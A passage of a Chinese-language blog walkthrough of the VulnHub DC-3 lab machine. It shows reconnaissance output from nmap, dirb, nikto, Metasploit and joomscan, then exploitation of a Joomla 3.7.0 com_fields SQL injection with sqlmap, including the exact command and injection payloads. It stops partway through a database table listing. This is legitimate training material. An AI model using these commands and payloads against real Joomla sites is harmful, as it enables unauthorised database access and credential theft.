@@ -1,0 +1,1170 @@
+---
+title: "VulnHub-DC3"
+layout: post
+date: 2021-12-11 18:13
+image: 
+headerImage: false
+tag:
+- web
+- vulnhub
+category: blog
+author: NoThxJ
+description: VulnHub
+---
+
+环境下载地址：
+
+<https://www.five86.com/dc-3.html>
+
+环境搭建：
+
+![1](https://havocykp.github.io/assets/images/img_blog5/1.png)
+
+信息收集
+
+Nmap探测攻击目标的IP
+
+DC-3 IP为：192.168.2.231
+
+![2](https://havocykp.github.io/assets/images/img_blog5/2.png)
+
+或者通过MAC地址确定目标IP
+
+端口扫描
+
+利用nmap对目标主机进行端口扫描，发现只开放了80端口
+
+```javascript
+命令：
+┌─[root@pendo]─[/home/pendo]
+└──╼ #nmap -A -p- 192.168.2.231
+```
+
+![3](https://havocykp.github.io/assets/images/img_blog5/3.png)
+
+访问：<http://192.168.2.231/>
+
+![4](https://havocykp.github.io/assets/images/img_blog5/4.png)
+
+目录扫描
+
+先进行一下目录探测，看开放了什么目录，除了后台没有什么有用信息
+
+访问扫描的目录，发现后台登录页面：
+
+<http://192.168.2.231/administrator/>
+
+```javascript
+─[root@pendo]─[/home/pendo]
+└──╼ #dirb http://192.168.2.231
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Sep  3 09:28:44 2021
+URL_BASE: http://192.168.2.231/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.2.231/ ----
+==> DIRECTORY: http://192.168.2.231/administrator/                             
+==> DIRECTORY: http://192.168.2.231/bin/                                       
+==> DIRECTORY: http://192.168.2.231/cache/                                     
+==> DIRECTORY: http://192.168.2.231/components/                                
+==> DIRECTORY: http://192.168.2.231/images/                                    
+==> DIRECTORY: http://192.168.2.231/includes/                                  
++ http://192.168.2.231/index.php (CODE:200|SIZE:7104)                          
+==> DIRECTORY: http://192.168.2.231/language/                                  
+==> DIRECTORY: http://192.168.2.231/layouts/                                   
+==> DIRECTORY: http://192.168.2.231/libraries/                                 
+==> DIRECTORY: http://192.168.2.231/media/                                     
+==> DIRECTORY: http://192.168.2.231/modules/                                   
+==> DIRECTORY: http://192.168.2.231/plugins/                                   
++ http://192.168.2.231/server-status (CODE:403|SIZE:301)                       
+==> DIRECTORY: http://192.168.2.231/templates/                                 
+==> DIRECTORY: http://192.168.2.231/tmp/                                       
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/ ----
+==> DIRECTORY: http://192.168.2.231/administrator/cache/                       
+==> DIRECTORY: http://192.168.2.231/administrator/components/                  
+==> DIRECTORY: http://192.168.2.231/administrator/help/                        
+==> DIRECTORY: http://192.168.2.231/administrator/includes/                    
++ http://192.168.2.231/administrator/index.php (CODE:200|SIZE:4800)            
+==> DIRECTORY: http://192.168.2.231/administrator/language/                    
+==> DIRECTORY: http://192.168.2.231/administrator/logs/                        
+==> DIRECTORY: http://192.168.2.231/administrator/modules/                     
+==> DIRECTORY: http://192.168.2.231/administrator/templates/                   
+                                                                               
+---- Entering directory: http://192.168.2.231/bin/ ----
++ http://192.168.2.231/bin/index.html (CODE:200|SIZE:31)                       
+                                                                               
+---- Entering directory: http://192.168.2.231/cache/ ----
++ http://192.168.2.231/cache/index.html (CODE:200|SIZE:31)                     
+                                                                               
+---- Entering directory: http://192.168.2.231/components/ ----
++ http://192.168.2.231/components/index.html (CODE:200|SIZE:31)                
+                                                                               
+---- Entering directory: http://192.168.2.231/images/ ----
+==> DIRECTORY: http://192.168.2.231/images/banners/                            
+==> DIRECTORY: http://192.168.2.231/images/headers/                            
++ http://192.168.2.231/images/index.html (CODE:200|SIZE:31)                    
+                                                                               
+---- Entering directory: http://192.168.2.231/includes/ ----
++ http://192.168.2.231/includes/index.html (CODE:200|SIZE:31)                  
+                                                                               
+---- Entering directory: http://192.168.2.231/language/ ----
++ http://192.168.2.231/language/index.html (CODE:200|SIZE:31)                  
+                                                                               
+---- Entering directory: http://192.168.2.231/layouts/ ----
++ http://192.168.2.231/layouts/index.html (CODE:200|SIZE:31)                   
+==> DIRECTORY: http://192.168.2.231/layouts/joomla/                            
+==> DIRECTORY: http://192.168.2.231/layouts/libraries/                         
+==> DIRECTORY: http://192.168.2.231/layouts/plugins/                           
+                                                                               
+---- Entering directory: http://192.168.2.231/libraries/ ----
+==> DIRECTORY: http://192.168.2.231/libraries/cms/                             
++ http://192.168.2.231/libraries/index.html (CODE:200|SIZE:31)                 
+==> DIRECTORY: http://192.168.2.231/libraries/joomla/                          
+==> DIRECTORY: http://192.168.2.231/libraries/legacy/                          
++ http://192.168.2.231/libraries/vendor (CODE:403|SIZE:304)                    
+                                                                               
+---- Entering directory: http://192.168.2.231/media/ ----
+==> DIRECTORY: http://192.168.2.231/media/cms/                                 
+==> DIRECTORY: http://192.168.2.231/media/contacts/                            
+==> DIRECTORY: http://192.168.2.231/media/editors/                             
++ http://192.168.2.231/media/index.html (CODE:200|SIZE:31)                     
+==> DIRECTORY: http://192.168.2.231/media/mailto/                              
+==> DIRECTORY: http://192.168.2.231/media/media/                               
+==> DIRECTORY: http://192.168.2.231/media/system/                              
+                                                                               
+---- Entering directory: http://192.168.2.231/modules/ ----
++ http://192.168.2.231/modules/index.html (CODE:200|SIZE:31)                   
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/ ----
+==> DIRECTORY: http://192.168.2.231/plugins/authentication/                    
+==> DIRECTORY: http://192.168.2.231/plugins/captcha/                           
+==> DIRECTORY: http://192.168.2.231/plugins/content/                           
+==> DIRECTORY: http://192.168.2.231/plugins/editors/                           
+==> DIRECTORY: http://192.168.2.231/plugins/extension/                         
+==> DIRECTORY: http://192.168.2.231/plugins/fields/                            
++ http://192.168.2.231/plugins/index.html (CODE:200|SIZE:31)                   
+==> DIRECTORY: http://192.168.2.231/plugins/installer/                         
+==> DIRECTORY: http://192.168.2.231/plugins/search/                            
+==> DIRECTORY: http://192.168.2.231/plugins/system/                            
+==> DIRECTORY: http://192.168.2.231/plugins/user/                              
+                                                                               
+---- Entering directory: http://192.168.2.231/templates/ ----
++ http://192.168.2.231/templates/index.html (CODE:200|SIZE:31)                 
+==> DIRECTORY: http://192.168.2.231/templates/system/                          
+                                                                               
+---- Entering directory: http://192.168.2.231/tmp/ ----
++ http://192.168.2.231/tmp/index.html (CODE:200|SIZE:31)                       
+==> DIRECTORY: http://192.168.2.231/tmp/packages/                              
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/cache/ ----
++ http://192.168.2.231/administrator/cache/index.html (CODE:200|SIZE:31)       
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/components/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/help/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/includes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/language/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/logs/ ----
++ http://192.168.2.231/administrator/logs/index.html (CODE:200|SIZE:31)        
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/modules/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/administrator/templates/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/images/banners/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/images/headers/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/layouts/joomla/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/layouts/libraries/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/layouts/plugins/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/libraries/cms/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/libraries/joomla/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/libraries/legacy/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/media/cms/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/media/contacts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/media/editors/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/media/mailto/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/media/media/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/media/system/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/authentication/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/captcha/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/content/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/editors/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/extension/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/fields/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/installer/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/search/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/system/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/plugins/user/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/templates/system/ ----
+==> DIRECTORY: http://192.168.2.231/templates/system/css/                      
+==> DIRECTORY: http://192.168.2.231/templates/system/html/                     
+==> DIRECTORY: http://192.168.2.231/templates/system/images/                   
++ http://192.168.2.231/templates/system/index.php (CODE:200|SIZE:0)            
+                                                                               
+---- Entering directory: http://192.168.2.231/tmp/packages/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/templates/system/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/templates/system/html/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.231/templates/system/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Fri Sep  3 09:30:27 2021
+DOWNLOADED: 83016 - FOUND: 20
+
+```
+
+Wappalyzer识别 该CMS是Joomla
+
+![5](https://havocykp.github.io/assets/images/img_blog5/5.png)
+
+敏感文件扫描：
+
+```javascript
+┌─[root@pendo]─[/home/pendo]
+└──╼ #nikto -h 192.168.2.231
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.231
++ Target Hostname:    192.168.2.231
++ Target Port:        80
++ Start Time:         2021-09-03 10:41:39 (GMT8)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ IP address found in the 'location' header. The IP is "127.0.1.1".
++ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
++ OSVDB-3092: /administrator/: This might be interesting...
++ OSVDB-3092: /bin/: This might be interesting...
++ OSVDB-3092: /includes/: This might be interesting...
++ OSVDB-3092: /tmp/: This might be interesting...
++ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /administrator/index.php: Admin login page/section found.
++ 8728 requests: 0 error(s) and 17 item(s) reported on remote host
++ End Time:           2021-09-03 10:42:30 (GMT8) (51 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+探测 Joomla 版本信息，查看该版本是否存在可利用漏洞
+
+```javascript
+msf6 > search Joomla
+
+Matching Modules
+================
+
+   #   Name                                                    Disclosure Date  Rank       Check  Description
+   -   ----                                                    ---------------  ----       -----  -----------
+   0   auxiliary/scanner/http/joomla_gallerywd_sqli_scanner    2015-03-30       normal     No     Gallery WD for Joomla! Unauthenticated SQL Injection Scanner
+   1   exploit/unix/webapp/joomla_tinybrowser                  2009-07-22       excellent  Yes    Joomla 1.5.12 TinyBrowser File Upload Code Execution
+   2   auxiliary/admin/http/joomla_registration_privesc        2016-10-25       normal     Yes    Joomla Account Creation and Privilege Escalation
+   3   exploit/unix/webapp/joomla_akeeba_unserialize           2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
+   4   auxiliary/scanner/http/joomla_bruteforce_login                           normal     No     Joomla Bruteforce Login Utility
+   5   exploit/unix/webapp/joomla_comfields_sqli_rce           2017-05-17       excellent  Yes    Joomla Component Fields SQLi Remote Code Execution
+   6   exploit/unix/webapp/joomla_comjce_imgmanager            2012-08-02       excellent  Yes    Joomla Component JCE File Upload Remote Code Execution
+   7   exploit/unix/webapp/joomla_contenthistory_sqli_rce      2015-10-23       excellent  Yes    Joomla Content History SQLi Remote Code Execution
+   8   exploit/multi/http/joomla_http_header_rce               2015-12-14       excellent  Yes    Joomla HTTP Header Unauthenticated Remote Code Execution
+   9   exploit/unix/webapp/joomla_media_upload_exec            2013-08-01       excellent  Yes    Joomla Media Manager File Upload Vulnerability
+   10  auxiliary/scanner/http/joomla_pages                                      normal     No     Joomla Page Scanner
+   11  auxiliary/scanner/http/joomla_plugins                                    normal     No     Joomla Plugins Scanner
+   12  auxiliary/gather/joomla_com_realestatemanager_sqli      2015-10-22       normal     Yes    Joomla Real Estate Manager Component Error-Based SQL Injection
+   13  auxiliary/scanner/http/joomla_version                                    normal     No     Joomla Version Scanner
+   14  auxiliary/gather/joomla_contenthistory_sqli             2015-10-22       normal     Yes    Joomla com_contenthistory Error-Based SQL Injection
+   15  auxiliary/gather/joomla_weblinks_sqli                   2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read
+   16  auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner  2015-03-20       normal     No     Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner
+
+
+Interact with a module by name or index. For example info 16, use 16 or use auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner
+
+```
+
+使用 Joolmla 版本扫描器，发现该版本为 3.7.0
+
+```javascript
+msf6 > use 13
+msf6 auxiliary(scanner/http/joomla_version) > show options
+
+Module options (auxiliary/scanner/http/joomla_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:por
+                                         t[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identi
+                                         fier, or hosts file with syntax 'file
+                                         :<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connec
+                                         tions
+   TARGETURI  /                yes       The base path to the Joomla applicati
+                                         on
+   THREADS    1                yes       The number of concurrent threads (max
+                                          one per host)
+   VHOST                       no        HTTP server virtual host
+
+msf6 auxiliary(scanner/http/joomla_version) > set rhosts 192.168.2.231
+rhosts => 192.168.2.231
+msf6 auxiliary(scanner/http/joomla_version) > run
+
+[*] Server: Apache/2.4.18 (Ubuntu)
+[+] Joomla version: 3.7.0
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+方法2：
+
+使用开源工具：<https://github.com/OWASP/joomscan>
+
+探测出 Joomla版本3.7.0
+
+登录后台地址：<http://192.168.2.231/administrator/>
+
+```javascript
+git clone https://github.com/rezasp/joomscan.git
+cd joomscan
+perl joomscan.pl -u http://192.168.2.231
+
+  ____  _____  _____  __  __  ___   ___    __    _  _ 
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+			(1337.today)
+   
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://192.168.2.231 ...
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://192.168.2.231/administrator/components
+http://192.168.2.231/administrator/modules
+http://192.168.2.231/administrator/templates
+http://192.168.2.231/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://192.168.2.231/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is not found
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+
+Your Report : reports/192.168.2.231/
+```
+
+探测 Joomla 3.7.0 漏洞
+
+发现此版本存在 SQL注入漏洞
+
+```javascript
+命令：
+sudo -i // 切换root权限
+┌─[root@pendo]─[~/joomscan]
+└──╼ #searchsploit joomla 3.7.0
+```
+
+![6](https://havocykp.github.io/assets/images/img_blog5/6.png)
+
+漏洞利用
+
+使用sqlmap
+
+```javascript
+// 爆表库 
+nothx@MacBookPro  ~  sqlmap -u "http://192.168.2.231/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+
+![7](https://havocykp.github.io/assets/images/img_blog5/7.png)
+
+爆表，找到名为__users表，其中保存了用户名和密码信息
+
+```javascript
+// 爆表
+nothx@MacBookPro  ~  sqlmap -u "http://192.168.2.231/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms mysql -D joomladb --tables
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.5.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:20:43 /2021-09-03/
+
+[12:20:44] [INFO] testing connection to the target URL
+[12:20:44] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=2d96do5o436...hj3dsd3f27'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(3218,CONCAT(0x2e,0x7176706a71,(SELECT (ELT(3218=3218,1))),0x71627a6271),6579))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2854 FROM (SELECT(SLEEP(5)))KXQz)
+---
+[12:20:46] [INFO] testing MySQL
+[12:20:46] [INFO] confirming MySQL
+[12:20:46] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+[12:20:46] [INFO] fetching tables for database: 'joomladb'
+[12:20:46] [INFO] retrieved: '#__assets'
+[12:20:46] [INFO] retrieved: '#__associations'
+[12:20:46] [INFO] retrieved: '#__banner_clients'
+[12:20:46] [INFO] retrieved: '#__banner_tracks'
+[12:20:46] [INFO] retrieved: '#__banners'
+[12:20:46] [INFO] retrieved: '#__bsms_admin'
+[12:20:46] [INFO] retrieved: '#__bsms_books'
+[12:20:46] [INFO] retrieved: '#__bsms_comments'
+[12:20:46] [INFO] retrieved: '#__bsms_locations'
+[12:20:46] [INFO] retrieved: '#__bsms_mediafiles'
+[12:20:46] [INFO] retrieved: '#__bsms_message_typ'
+[12:20:46] [INFO] retrieved: '#__bsms_podcast'
+[12:20:46] [INFO] retrieved: '#__bsms_series'
+[12:20:46] [INFO] retrieved: '#__bsms_servers'
+[12:20:47] [INFO] retrieved: '#__bsms_studies'
+[12:20:47] [INFO] retrieved: '#__bsms_studytopics'
+[12:20:47] [INFO] retrieved: '#__bsms_teachers'
+[12:20:47] [INFO] retrieved: '#__bsms_templatecod'
+[12:20:47] [INFO] retrieved: '#__bsms_templates'
+[12:20:47] [INFO] retrieved: '#__bsms_timeset'
+[12:20:47] [INFO] retrieved: '#__bsms_topics'
+[12:20:47] [INFO] retrieved: '#__bsms_update'
+[12:20:47] [INFO] retrieved: '#__categories'
+[12:20:47] [INFO] retrieved: '#__contact_details'
+[12:20:47] [INFO] retrieved: '#__content'
+[12:20:47] [INFO] retrieved: '#__content_frontpag'
+[12:20:47] [INFO] retrieved: '#__content_rating'
+[12:20:47] [INFO] retrieved: '#__content_types'
+[12:20:47] [INFO] retrieved: '#__contentitem_tag_'
+[12:20:47] [INFO] retrieved: '#__core_log_searche'
+[12:20:47] [INFO] retrieved: '#__extensions'
+[12:20:47] [INFO] retrieved: '#__fields'
+[12:20:47] [INFO] retrieved: '#__fields_categorie'
+[12:20:47] [INFO] retrieved: '#__fields_groups'
+[12:20:47] [INFO] retrieved: '#__fields_values'
+[12:20:47] [INFO] retrieved: '#__finder_filters'
+[12:20:47] [INFO] retrieved: '#__finder_links'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_links_ter'
+[12:20:47] [INFO] retrieved: '#__finder_taxonomy'
+[12:20:47] [INFO] retrieved: '#__finder_taxonomy_'
+[12:20:47] [INFO] retrieved: '#__finder_terms'
+[12:20:47] [INFO] retrieved: '#__finder_terms_com'
+[12:20:47] [INFO] retrieved: '#__finder_tokens'
+[12:20:47] [INFO] retrieved: '#__finder_tokens_ag'
+[12:20:47] [INFO] retrieved: '#__finder_types'
+[12:20:47] [INFO] retrieved: '#__jbsbackup_timese'
+[12:20:47] [INFO] retrieved: '#__jbspodcast_times'
+[12:20:47] [INFO] retrieved: '#__languages'
+[12:20:48] [INFO] retrieved: '#__menu'
+[12:20:48] [INFO] retrieved: '#__menu_types'
+[12:20:48] [INFO] retrieved: '#__messages'
+[12:20:48] [INFO] retrieved: '#__messages_cfg'
+[12:20:48] [INFO] retrieved: '#__modules'
+[12:20:48] [INFO] retrieved: '#__modules_menu'
+[12:20:48] [INFO] retrieved: '#__newsfeeds'
+[12:20:48] [INFO] retrieved: '#__overrider'
+[12:20:48] [INFO] retrieved: '#__postinstall_mess'
+[12:20:48] [INFO] retrieved: '#__redirect_links'
+[12:20:48] [INFO] retrieved: '#__schemas'
+[12:20:48] [INFO] retrieved: '#__session'
+[12:20:48] [INFO] retrieved: '#__tags'
+[12:20:48] [INFO] retrieved: '#__template_styles'
+[12:20:48] [INFO] retrieved: '#__ucm_base'
+[12:20:48] [INFO] retrieved: '#__ucm_content'
+[12:20:48] [INFO] retrieved: '#__ucm_history'
+[12:20:48] [INFO] retrieved: '#__update_sites'
+[12:20:48] [INFO] retrieved: '#__update_sites_ext'
+[12:20:48] [INFO] retrieved: '#__updates'
+[12:20:48] [INFO] retrieved: '#__user_keys'
+[12:20:48] [INFO] retrieved: '#__user_notes'
+[12:20:48] [INFO] retrieved: '#__user_profiles'
+[12:20:48] [INFO] retrieved: '#__user_usergroup_m'
+[12:20:48] [INFO] retrieved: '#__usergroups'
+[12:20:48] [INFO] retrieved: '#__users'
+[12:20:48] [INFO] retrieved: '#__utf8_conversion'
+[12:20:48] [INFO] retrieved: '#__viewlevels'
+Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
